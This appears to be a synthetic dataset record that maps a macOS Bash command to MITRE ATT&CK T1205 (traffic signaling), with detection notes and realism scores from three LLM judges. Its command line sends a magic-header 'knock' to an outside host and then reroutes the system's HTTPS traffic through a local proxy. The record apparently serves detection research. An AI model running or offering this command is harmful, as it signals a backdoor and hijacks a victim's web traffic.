@@ -1,0 +1,57 @@
+{
+  "technique_id": "T1205",
+  "platform": "macOS",
+  "shell": "Bash",
+  "command": "curl -s -H 'X-Trigger: 1337' https://203.0.113.10:8443/knock && networksetup -setsecurewebproxy \"Wi-Fi\" 127.0.0.1 8443 && networksetup -setsecurewebproxystate \"Wi-Fi\" on",
+  "explanation": "Uses an application-layer magic header over HTTPS as a covert signal to a listener, then switches the system to route HTTPS through a local proxy. Detection: inspect for non-standard headers to odd endpoints and watch for sudden enablement of secure web proxy settings.",
+  "rationale_steps": [
+    "Issue an HTTPS request bearing a magic header that a backdoor monitors for activation.",
+    "Upon acknowledgment, configure the secure web proxy to a local port for controlled egress.",
+    "Detect via web proxy/firewall logs for unusual header patterns and monitor secure proxy state changes."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-BASH-T1205-d65eb033-b3f98834",
+  "source_prompt_hash": "d65eb033",
+  "timestamp_utc": "2025-09-30T06:10:08.592373Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judgments": [
+      {
+        "model": "gpt-5",
+        "syntactic_score": 5,
+        "syntactic_justification": "Well-formed with balanced quotes, valid flags, and proper && chaining for sequential execution.",
+        "semantic_score": 4,
+        "semantic_justification": "It signals via a custom HTTPS header then configures the macOS secure web proxy to a local listener consistent with T1205, but setting proxy state typically requires elevated privileges so may fail without them.",
+        "combined_score": 4.5,
+        "confidence": 0.9,
+        "timestamp": "2025-10-01T15:30:43.850839Z"
+      },
+      {
+        "model": "claude-sonnet-4-6",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed with balanced quotes, valid curl flags and headers, proper && chaining, and correct networksetup subcommand syntax for macOS.",
+        "semantic_score": 5,
+        "semantic_justification": "The command accurately implements T1205 by sending a covert application-layer signal via a custom HTTP header (X-Trigger: 1337) to an unusual endpoint, then configures the macOS system proxy to route HTTPS traffic through a local listener on the same port, which is operationally coherent and realistic for traffic signaling combined with C2 redirection.",
+        "combined_score": 5.0,
+        "confidence": 0.92,
+        "timestamp": "2026-02-19T03:52:53.340420Z"
+      },
+      {
+        "model": "gemini-3-flash-preview",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command uses proper bash syntax, correct flag formatting for curl and networksetup, and correctly chains commands using the logical AND operator.",
+        "semantic_score": 4,
+        "semantic_justification": "The use of a custom HTTP header effectively demonstrates traffic signaling (T1205), though the subsequent network configuration commands typically require administrative privileges on macOS.",
+        "combined_score": 4.5,
+        "confidence": 1.0,
+        "timestamp": "2026-02-19T03:52:56.820122Z"
+      }
+    ],
+    "llm_average_syntactic": 5.0,
+    "llm_average_semantic": 4.333,
+    "llm_average_score": 4.667,
+    "llm_verdict": "likely_match",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
